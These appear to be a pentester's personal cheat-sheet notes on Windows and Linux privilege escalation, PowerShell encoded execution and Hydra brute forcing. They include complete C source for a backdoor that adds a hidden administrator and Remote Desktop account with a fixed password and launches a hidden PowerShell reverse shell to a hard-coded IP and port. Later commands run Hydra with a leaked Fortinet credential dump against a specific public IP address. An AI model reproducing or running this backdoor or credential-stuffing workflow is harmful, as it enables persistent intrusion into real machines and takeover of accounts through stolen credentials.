### FINDING ACCESS CONTROL (ACL) OF EXECUTABLES 
```powershell
$path=get-ciminstance -class win32_service | select name,pathname
$pathname=$path.pathname
$final=$pathname |  ForEach-Object {$_.split("-k")[0]} 
foreach ($acl in $final){ icacls $acl}

#finding acl of all the executables , we canuse more precise filterationand formatting 
foreach ($acl in $final) { icacls $acl | where-object {$_ -like " BUILTIN\Administrators:(F)" | select-object *} }

```


```powershell
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
#remove auto section to see all the exe , 

Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
#general command to list all the service 
the output path contain -k which represent a group use the query for svchost to get a list of all the groups 


wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ 
#run this in cmd bcz of escape sequence , 

Get-ItemProperty 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost' -Verbose
#print all the groups used by svchost and in those groups what services are there , when execution happen svchost.exe -k -groupname -p is used for extra protection 

get-itemproperty 'HKLM:SYSTEM\CurrentControlSet\Services\<ServiceName>'
will list discription of that service and dll , parameter are not present all the time

schtasks /query /fo LIST /v | where-object {$_ -match "nameof-fields-to-output | canbeuseas or statement "}




```

```powershell
 foreach ($filepath in $final) { icacls $filepath | findstr /s "Administrator" }
```

#windows-privesc
### ENCODING COMMANDS FOR POWERSHELL IN LINUX 
```bash
echo -n "<CMD>" | iconv --to-code UTF-16LE | base64 -w 0
```

### POWERSHELL ENCODED COMMAND EXECUTION 
```POWERSHELL
powershell -ep bypass -enc "<encoded-command>"

#if single argument is allowed we can also use powershell -c (command to execute )
powershell -c "powershell -ep bypass -enc <encodedcommand>"
```
^chat-gpt-output-windows
## 🧠 Here's How to Determine It Practically

Windows services (in registry or through APIs) store the executable path in a field called `ImagePath`. This is used when the Service Control Manager starts the service — and passed to `CreateProcess`.

### 🛑 If the `ImagePath` is:

- **Unquoted**
    
- **Contains spaces**
    
- **Includes both `.exe` path and arguments**
    

Then Windows will call:

`CreateProcess(NULL, lpCommandLine_unquoted, ...);`

✅ So **`lpApplicationName` is NULL** here — the system will parse the executable from the `lpCommandLine`.

---

## ✅ How to Find This

You can check this using:

### 1. **PowerShell**



`Get-WmiObject win32_service | Where-Object {     $_.PathName -notmatch '^".*"$' -and $_.PathName -match '\s' } | Select-Object Name, StartName, PathName`

This filters services where:

- `PathName` is **not quoted**
    
- Contains **spaces**
    

💡 These services are likely launched with `lpApplicationName = NULL`, and thus potentially vulnerable.

---

### 2. **Manual via Registry**

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>`

Check the **`ImagePath`** value:

- If it looks like:
    
    makefile
    
    `C:\Program Files\My App\service.exe -arg1`
    
    🔥 Then `lpApplicationName = NULL`, and it's a candidate for unquoted path exploitation.
    
- But if it’s:
    
    arduino
    
    `"C:\Program Files\My App\service.exe" -arg1`
    
    ✅ Then quoting prevents misinterpretation — still `lpApplicationName = NULL`, but parsing works properly (no vuln).
    

---

### 3. **Using Sysinternals Process Explorer**

You can:

- Check the **command line** of the process under the "Command Line" column.
    
- If you see the path unquoted with spaces, that's your hint.


## PRIVESC backdoor C code 

```c
#include <windows.h>
#include <lm.h>
#include <stdio.h>

#pragma comment(lib, "netapi32.lib")

DWORD AddUserAndReverseShell() {
    // Step 1: Create the user
    USER_INFO_1 ui;
    DWORD dwLevel = 1;
    DWORD dwError = 0;

    ui.usri1_name = L"backdoor";
    ui.usri1_password = L"P@ssw0rd123";
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    NET_API_STATUS nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);
    if (nStatus == NERR_Success || nStatus == NERR_UserExists) {
        printf("[+] User 'backdoor' created or already exists.\n");
    } else {
        printf("[-] Failed to create user: %ld\n", nStatus);
        return 1;
    }

    // Step 2: Add to Administrators group
    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = L"backdoor";
    nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    if (nStatus == NERR_Success || nStatus == ERROR_MEMBER_IN_ALIAS) {
        printf("[+] User added to Administrators group.\n");
    } else {
        printf("[-] Failed to add user to Administrators: %ld\n", nStatus);
        return 1;
    }

    // Step 3: Add to Remote Desktop Users group
    nStatus = NetLocalGroupAddMembers(NULL, L"Remote Desktop Users", 3, (LPBYTE)&account, 1);
    if (nStatus == NERR_Success || nStatus == ERROR_MEMBER_IN_ALIAS) {
        printf("[+] User added to Remote Desktop Users group.\n");
    } else {
        printf("[-] Failed to add user to Remote Desktop Users: %ld\n", nStatus);
        return 1;
    }

    // Step 4: Launch reverse shell via PowerShell
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    const char* cmd = "cmd.exe /c powershell -w hidden -nop -c \"$c=New-Object Net.Sockets.TCPClient('192.168.45.206',7777);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}\"";

    if (!CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to launch reverse shell.\n");
        return 1;
    } else {
        printf("[+] Reverse shell launched to 192.168.45.206:7777\n");
    }

    return 0;
}

int main() {
    return AddUserAndReverseShell();
}
```

```bash
 find /usr/bin -type f -executable -perm -u=s 2>/dev/null | xargs -I{} sh -c 'echo -e "\n=== {} ==="; ldd "{}" 2>/dev/null'

find /usr/bin -type f -executable 2>/dev/null | xargs -I{} bash -c 'echo "[*] Scanning: {}"; strace "{}"'

find /usr/bin -type f -executable -perm -u=s -exec ls -lah {} + 2>/dev/null  

find /usr/bin -type f -perm -u=x  -exec file  {} + 2>/dev/null | grep ELF | grep -v "flatpak\|snap" | nl

find /usr/bin -type f  -exec file  {} + 2>/dev/null | grep ELF | grep -v "flatpak\|snap" | nl

this file command can filter all the types of file like png jpeg or any other file ,

another idiea thati have is magic bytes if we have somethng tofilter via those then use the list file --list command 

ps -eo "%p %P %G %U %a %n" 

ps -eo pid,user | awk '$2=="root" {print $1}' > pid.txt

for i in $(cat pid.txt);do find /proc -type d -name $i -exec ls {} + 2>/dev/null ; done
```

## HTTP BASIC AUTHENTICATION VIA GET REQEST
#tool-hydra
hydra user pass -s port ip get|post /route/to/http-auth
**hydra -C ./Leaked-Databases/fortinet-2021 -s 9090 84.17.62.42 http-get /**

## TROUBLESHOOTING HYDRA SENDING ALL REQUEST TO BURP PROXY 
#tool-hydra 
**HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C fortinet-cleancombo.txt -s 9090 84.17.62.42 http-get /**

## VERBOSE OUTPUT
#tool-hydra 
**HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C fortinet-cleancombo.txt -s -vV 9090 84.17.62.42 http-get /**

```bash
 grep -v "Novie*" ./Leaked-Databases/fortinet-2021_clean-combos.txt > fortinet-cleancombo.txt
 hydra -C ./Leaked-Databases/fortinet-2021 -s 9090 84.17.62.42 http-get /
 hydra -C ./Leaked-Databases/fortinet-cleancombo.txt -vV -s 9090 84.17.62.42 http-get /
```

## HYDRA HTTP POST FORM BRUTEFORCE
#tool-hydra 
#### **hydra \<user\> \<pass\> url service-to-attack "route:var1=^value^&var2=^value^&var3=^value^:error-to-determine-login-is-failed"**

```shell
hydra -l pmausers0DdIXFt -p bad-password wordpress.pentest-ground.com https-form-post "/mysqladmin/index.php:pma_username=^USER^&pma_password=^PASS^&set_session=6lf49aspt3l4afa6is1nfld3sn&server=1&route=%2F&lang=en&token=555a3b4c7631212f3e7161443b263b28:Cannot log in to the MySQL server"
```
## RUNNING POSTGRESQL AND METASPLOIT 
```shell
msfdb run
```
it will start both , hence we get better speed when searching and using metasploit 


